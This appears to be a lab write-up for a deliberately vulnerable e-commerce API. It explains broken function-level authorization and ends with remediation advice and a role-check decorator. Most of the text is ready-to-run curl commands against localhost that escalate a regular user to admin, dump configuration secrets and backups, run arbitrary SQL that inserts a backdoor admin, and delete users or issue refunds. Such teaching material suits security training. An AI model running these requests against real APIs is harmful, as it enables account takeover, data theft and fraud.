API5:2023 Broken Function Level Authorization (BFLA)

HIGH SEVERITY

Description

Broken Function Level Authorization occurs when APIs don't properly verify if the user has permission to execute specific functions. Administrative endpoints are often exposed to regular users, allowing them to perform privileged actions.

Affected Files

  • app/routes/admin.py - All endpoints lack proper admin verification
  • app/routes/products.py - Create/Update/Delete without role check
  • app/routes/orders.py - Bulk operations without authorization
  • app/routes/users.py - Delete users without admin check

Exploitation Guide

1. Access Admin Endpoints as Regular User

Admin endpoints only check for authentication, not admin role:

# Login as regular user
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "john", "password": "password123"}' | jq -r '.token')

# Access admin user list
curl http://localhost:5000/api/admin/users \
  -H "Authorization: Bearer $TOKEN"

# View application configuration (secrets!)
curl http://localhost:5000/api/admin/config \
  -H "Authorization: Bearer $TOKEN"

# Access audit logs
curl http://localhost:5000/api/admin/logs \
  -H "Authorization: Bearer $TOKEN"

# Download full database backup
curl http://localhost:5000/api/admin/backup \
  -H "Authorization: Bearer $TOKEN"

2. Execute Admin Functions

Regular users can execute administrative operations:

# Change anyone's role to admin
curl -X PUT http://localhost:5000/api/admin/users/2/role \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'

# Deactivate any user account (even admin!)
curl -X POST http://localhost:5000/api/admin/users/1/deactivate \
  -H "Authorization: Bearer $TOKEN"

# Create discount coupons
curl -X POST http://localhost:5000/api/admin/coupons \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "code": "HACKER100",
    "discount_percent": 100,
    "max_uses": 1000
  }'

3. Execute Raw SQL Queries

Database query endpoint accessible to any authenticated user:

# Execute arbitrary SQL
curl -X POST http://localhost:5000/api/admin/database/query \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query": "SELECT * FROM users"}'

# Update data directly
curl -X POST http://localhost:5000/api/admin/database/query \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query": "UPDATE users SET role = '\''admin'\'' WHERE id = 2"}'

# Insert new admin user
curl -X POST http://localhost:5000/api/admin/database/query \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query": "INSERT INTO users (username, email, password, role) VALUES ('\''backdoor'\'', '\''back@door.com'\'', '\''pass'\'', '\''admin'\'')"}'

4. Product Management (Non-Admin)

Any authenticated user can manage products:

# Create product (should be admin only)
curl -X POST http://localhost:5000/api/products \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Malicious Product",
    "price": 0.01,
    "description": "Created by non-admin"
  }'

# Delete any product
curl -X DELETE http://localhost:5000/api/products/1 \
  -H "Authorization: Bearer $TOKEN"

# Bulk price manipulation
curl -X POST http://localhost:5000/api/products/bulk-price-update \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"updates": [{"product_id": 1, "price": 0.01}]}'

5. User Management (Non-Admin)

Delete or modify any user:

# Delete admin user
curl -X DELETE http://localhost:5000/api/users/1 \
  -H "Authorization: Bearer $TOKEN"

# Modify admin's password
curl -X PUT http://localhost:5000/api/users/1 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"password": "pwned123"}'

6. Order Management

Bulk operations without proper authorization:

# Bulk cancel orders
curl -X POST http://localhost:5000/api/orders/bulk-status \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"order_ids": [1, 2, 3], "status": "cancelled"}'

# Refund any order
curl -X POST http://localhost:5000/api/orders/1/refund \
  -H "Authorization: Bearer $TOKEN"

Impact

  • Full Admin Access: Regular users can perform all admin functions
  • Data Manipulation: Direct database access via SQL queries
  • Business Disruption: Delete products, cancel orders, deactivate users
  • Secret Exposure: Access to configuration including API keys
  • Privilege Escalation: Make any user an admin

Remediation

  1. Implement role-based access control (RBAC)
  2. Verify role from database, not just from token
  3. Use @admin_required decorator consistently
  4. Separate admin routes into different service/port
  5. Log all admin actions for audit
# Proper admin check
def admin_required(f):
    @wraps(f)
    @token_required
    def decorated(*args, **kwargs):
        # Verify role from DATABASE, not token
        user = User.query.get(g.current_user_id)
        if not user or user.role != 'admin':
            return jsonify({'error': 'Admin access required'}), 403
        return f(*args, **kwargs)
    return decorated
